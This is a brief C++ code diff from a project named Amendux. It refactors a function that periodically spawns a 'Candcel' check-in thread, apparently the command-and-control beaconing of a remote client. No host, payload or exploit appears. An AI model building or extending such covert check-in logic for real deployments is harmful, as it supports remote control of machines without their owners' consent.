@@ -32,12 +32,12 @@ namespace Amendux {
 			return checkInCount;
 		}
 
-		static void SpawnInterval(Candcel *cc) {
+		static void SpawnInterval() {
 			if (!Config::Current()->CanConnect()) {
 				return;
 			}
 
-			Thread<Candcel> *thread = new Thread<Candcel>(cc, &Candcel::CheckIn);
+			Thread<Candcel> *thread = new Thread<Candcel>(Candcel::Current(), &Candcel::CheckIn);
 			if (!thread->Start()) {
 				Log::Error(L"Candcel", L"Cannot spawn checkin process");
 			}
